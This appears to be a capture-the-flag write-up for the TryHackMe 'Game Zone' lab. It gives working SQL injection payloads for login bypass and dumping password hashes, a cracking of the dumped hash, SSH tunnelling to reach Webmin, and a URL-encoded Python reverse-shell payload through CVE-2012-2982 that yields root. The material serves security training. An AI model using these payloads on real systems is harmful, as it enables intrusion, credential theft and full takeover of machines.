---
title: THM - Game Zone
tags: [thm, sql injection, ssh tunneling, webmin 1.580, CVE-2012-2982]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f840de8ced2851ef65e39bf9d809751e.jpeg" alt="Challenge logo" style="height:150px;">
</div>

This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

## Deploy the vulnerable machine

We have to simply access their VPN and scan the target machine to find how many ports are open.

```
$ nmap -sC -sV 10.10.128.187

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
```

Let's visit the web page

![](/assets/img/game-zone-web-page.PNG)

Nothing really interesting. Let's see if the application is vulnerable to SQL Injection.

## Obtain access with SQLi

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

```
SELECT * FROM users WHERE username = 'username_input' AND password = 'password_input'
```

This query is usually used to handle login requests.

We can insert some malicious input and, if not controlled, we can run other queries than those intended. Let's assume we have retrieved an username: `admin`. We could log in as administrator by giving the application an input like

```
username_input : admin
password_input : ' or 1=1 -- -
```

The query from earlier becomes

```
SELECT * FROM users WHERE username = 'admin' AND password = ' ' OR 1=1 -- - '
```

This query get all infos from the `users` table if the username is `admin` and the password is equal to `' '` (empty string) or `1=1` (which is obviously always true). This query would always return a true result and would log us in as admin. `-- -` comments everything after it and prevent it to be executed.

The machine instructions tells us that we need to insert `' or 1=1 -- -` in the username field and we will log in.

After we try it we are redirected to `post.php` page which give us the option to search for game reviews.

![](/assets/img/game-zone-portal.PNG)

## Using SQLMap

We are not kiddies so we will exploit this SQL Injection vulnerability by hand.

Let's see if the search option is vulnerable to SQL Injection by giving `'` as input. The page throws an error

![](/assets/img/game-zone-portal-first-error.PNG) 

We don't know how many columns are used in the query so we need to give the application some `ORDER BY` inputs until the application throws an error.

```
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
' ORDER BY 4 -- -
```

With the last one the page prints out this error

![](/assets/img/game-zone-order-by-error.PNG)

This tells us that the query use three columns. Let's see which one are reflected in the page output

```
' UNION SELECT 1, 2, 3 -- -
```

![](/assets/img/game-zone-union-reflection.PNG)

The second and the third one are used as the page output. We need to use these two to print out the results of our queries. Let's get the current tables

```
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = DATABASE() -- -
```

![](/assets/img/game-zone-table-name.PNG)

`users` looks interesting. Let's get the column names

```
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_schema = DATABASE() -- -
```

![](/assets/img/game-zone-columns-name.PNG)

We can print the `username` and `pwd` ones.

```
' UNION SELECT 1, username, pwd FROM users -- -
```
![](/assets/img/game-zone-pwd-dump.PNG)

We have one user and his hashed password!

## Cracking a password with JohnTheRipper

John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.

We will use this program to crack the hash we obtained earlier. JohnTheRipper is 15 years old and other programs such as HashCat are one of several other cracking programs out there. 

This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.

Let's crack the hash to retrieve `agent47`'s password.

```
$ echo 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > hash
$ hashid hash

Analyzing 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256) 
```

Looks like SHA-256. Let's crack it with JTR

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA256

videogamer124    (?)   
```

We have the plaintext password. Let's log into the machine throught SSH

```
$ ssh agent47@10.10.128.187

agent47@gamezone:~$ 
```

We are in. Print the user flag

```
agent47@gamezone:~$ cat user.txt

649ac17b1480ac13ef1e4fa5[redacted] 
```


## Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

Let's see which services are running on this machine

```
agent47@gamezone:~$ ss -tlnp

State      Recv-Q Send-Q      Local Address:Port      Peer Address:Port              
LISTEN     0      80          127.0.0.1:3306                  *:*                  
LISTEN     0      128                 *:10000                 *:*                  
LISTEN     0      128                 *:22                    *:*                  
LISTEN     0      128                :::80                   :::*                  
LISTEN     0      128                :::22                   :::*   
```

We can see that the machine has a service running on port 10000 accessible only from localhost. SSH has a feature which lets us tunnel a port to our localhost. With this we can access a service on our machine. Type this into your machine

```
$ ssh -L 10000:localhost:10000 agent47@10.10.128.187

agent47@gamezone:~$
```

We can access the service visiting `http://localhost:10000` on our machine

![](/assets/img/game-zone-webmin.PNG)

Let's reuse the credentials we found earlier to log in the CMS

![](/assets/img/game-zone-webmin-dashboard.PNG)

## Privilege Escalation with Metasploit

We can search if `Webmin 1.580` has some known vulnerabilities

```
$ searchsploit webmin 1.580

---------------------------------------------------------------------------------------------------
 Exploit Title                                                          |  Path
---------------------------------------------------------------------------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)   | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)           | linux/webapps/47330.rb
---------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

Looks like it. We will focus on the first one which is identified as `CVE-2012-2982` and can be found with a simple online search

- [Webmin 1.580 "/file/show.cgi" Remote Code Execution](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2982) 

This vulnerability description is: _"file/show.cgi in Webmin 1.590 and earlier allows remote authenticated users to execute arbitrary commands via an invalid character in a pathname, as demonstrated by a \| (pipe) character."_

Looking at some PoCs online we can see that `/file/show.cgi` can execute commands (AS ROOT !!!) if the payload looks something like

```
/file/show.cgi/bin/<random hex chars>|<command url encoded>|
```

We can try to ping our machine back. Type this in your machine to remain listening for ICMP packets on the `tun0` interface.

```
$ sudo tcpdump -i tun0 icmp
```

Let's send our payload url encoding this command: `ping -c 4 10.10.36.42`

```
http://localhost:10000/file/show.cgi/bin/A|ping%20-c%204%2010.10.36.42|
```

We can confirm the vulnerability by looking at incoming packets. It's time to fully compromise this machine. 

Initialize a netcat listener on port 4242

```
$ nc -lvnp 4242
```

I used a simple Python reverse shell I found on PayloadAllTheThings' cheatsheet.

- [PayloadAllTheThings Python reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) 

As before, you have to url-encode the payload first.

```
http://localhost:10000/file/show.cgi/bin/A|python%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.36.42%22%2C4242))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27|
```

Immediately after sending the request we can see the connection to our machine

```
$ nc -lvnp 4242

Connection from 10.10.128.187 43114 received!
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
a4b945830144bdd71908d12d[redacted] 
```